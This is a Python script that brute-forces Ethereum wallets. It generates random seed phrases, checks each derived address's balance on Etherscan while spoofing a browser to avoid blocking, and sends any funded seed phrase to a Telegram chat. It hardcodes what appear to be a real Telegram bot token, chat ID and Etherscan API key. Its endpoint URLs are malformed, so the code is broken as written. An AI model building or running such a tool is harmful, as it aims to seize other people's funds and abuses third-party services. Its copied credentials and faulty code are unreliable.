import requests
import time
import os
import logging
from threading import Thread
from flask import Flask
from eth_account import Account
from mnemonic import Mnemonic

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

class WalletEngine:
    def __init__(self):
        self.tg_token = "8794852622:AAH9p2HSno2YPPIssRE5En0Ii2Wv84E8_pA" 
        self.chat_id = "391754544"
        self.eth_key = "8RTIQAK1ZZUNC2JNZ5EM13BCRHVZ26UA9R"
        self.total_checked = 0
        self.mnemo = Mnemonic("english")
        Account.enable_unaudited_hdwallet_features()
        self.session = requests.Session()
        # شبیه‌سازی مرورگر برای جلوگیری از بلاک شدن
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })

    def _notify(self, text):
        url = f"https://telegram.org{self.tg_token}/sendMessage"
        try:
            self.session.post(url, json={'chat_id': self.chat_id, 'text': text, 'parse_mode': 'Markdown'}, timeout=15)
        except: pass

    def scanner_loop(self):
        logger.info("🚀 SYSTEM STARTED - ANTI-BLOCK ENABLED")
        while True:
            try:
                words = self.mnemo.generate(strength=128)
                acc = Account.from_mnemonic(words)
                
                api_url = "https://etherscan.io"
                query_params = {
                    "module": "account",
                    "action": "balance",
                    "address": acc.address,
                    "tag": "latest",
                    "apikey": self.eth_key
                }
                
                resp = self.session.get(api_url, params=query_params, timeout=15)
                
                # بررسی اینکه آیا پاسخ حتماً JSON است
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if data.get('status') == '1':
                            bal = int(data.get('result', 0))
                            if bal > 0:
                                self._notify(f"💎 FOUND!\n`{words}`\n{acc.address}")
                        
                        self.total_checked += 1
                        if self.total_checked % 50 == 0:
                            logger.info(f"Progress: {self.total_checked} wallets checked.")
                        
                        time.sleep(2.5) # افزایش وقفه برای پایداری بیشتر
                    except:
                        logger.warning("⚠️ Etherscan returned non-JSON response. Sleeping 30s...")
                        time.sleep(30)
                else:
                    logger.error(f"❌ Server Error: {resp.status_code}")
                    time.sleep(60)

            except Exception as e:
                logger.error(f"Error: {e}")
                time.sleep(20)

engine = WalletEngine()
app = Flask(__name__)

@app.route('/')
def home():
    return {"status": "ok", "total": engine.total_checked}, 200

if __name__ == "__main__":
    Thread(target=engine.scanner_loop, daemon=True).start()
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
